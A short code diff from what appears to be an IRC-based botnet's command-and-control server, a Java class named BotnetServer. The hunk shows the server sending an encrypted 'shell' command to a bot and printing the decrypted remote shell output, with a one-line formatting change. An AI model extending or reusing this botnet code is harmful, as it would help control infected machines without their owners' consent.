@@ -405,7 +405,7 @@ public class BotnetServer extends PircBot {
 				chat.sendLine(botKeys.get(botNick).encryptMsg("shell"));
 				// TODO: decrypt this
 				//System.out.print(shellout.nextLine());
-				System.out.println(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
+				System.out.print(botKeys.get(botNick).decryptMsg(shellout.nextLine()));
 				//String msg = shellout.nextLine();
 				//System.out.println(msg);
 				//System.out.println(masterMsgE.decryptMsg(msg));
